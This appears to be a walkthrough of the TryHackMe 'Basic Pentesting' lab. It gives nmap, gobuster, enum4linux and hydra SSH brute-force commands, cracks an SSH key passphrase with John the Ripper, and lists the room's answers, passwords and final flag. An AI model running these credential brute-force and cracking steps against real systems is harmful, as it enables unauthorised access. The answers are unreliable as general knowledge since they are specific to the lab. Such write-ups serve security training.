# Basic Pentesting

Find the challenge here: [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)

### Description:
A small challenge with only one task. Mainly about Web Application Testing.

## Task 1: Web App Testing and Privilege Escalation

#### Question 1: Find the services exposed by the machine

Smells nmap:

 1) sudo nmap -sV -sS 10.10.97.136
 2) **ssh**, **http**, **netios-ssn (Port 139 and 445)**, **ajp13**, **http-proxy**

#### Question 2: What is the name of the hidden directory on the web server (enter name without /)?

Dirbuster and Gobuster are useful tools for finding hidden directories on webservers so lets try Gobuster (faster and no gui needed here):

  1) gobuster dir -u http://10.10.97.136 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
  2) The direcotry **development** is found.

#### Question 3: Use brute-forcing to find the username & password

Since Port 139 and 445 are open (both are Ports that are commonly used for Samba) ad the files in the development directory from the last question mention samba and version 2.5.12 (could be Apache as well) I went with trying to exploit this. No success sadly. So I went with using enum4linux and hydra to get the username and password:

  1. enum4linux -a 10.10.97.136
  2. Found two users: **kay** and **jan**
  3. hydra -t4 -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.97.136
  4. Password of jan is **armando**.

#### Question 4: What is the username?

From what was found in the task before it is **jan**

#### Question 4: What is the password?

From what was found in the task before it is **armando**

#### Question 4: What service do you use to access the server(answer in abbrevation in all caps)?

**SSH** was used.

#### Question 5: Enumerate the machine to find any vectors for privilege escalation.

Logging in with jan lets one enumerate the machine.

#### Question 6: What is the name of the other user you found(all lower case)?

There is a user named **kay**.

#### Question 7: If you have found another user, what can you do with this information?

Since the user is known and we got a public key we can use JtR to crack it and try tp login as said user.

First the key needs to be safed on the attacker machine. After that ssh2john was used to get a hash of the key and run JtR on it.

  1) python /usr/share/john/ssh2john.py kay_id_rsa > hashes.txt
  2) john --wordlist=/usr/share/worldlist/rockyou.txt hashes.txt
  3) The hash is cracked and the plaintext of it is **beeswax**
  4) Now after logging in as jan the following command allows to connect as kay when given the correct passphrase: 
     ssh -i /home/kay/.ssh/id_rsa kay@10.10.97.136

#### Question 8: What is the final password you obtain?

As kay it is simple to find the final password since it is saved in the file 'pass.bak'

  1) cat pass.bak
  2) The password is: **heresareallystrongpasswordthatfollowsthepasswordpolicy**


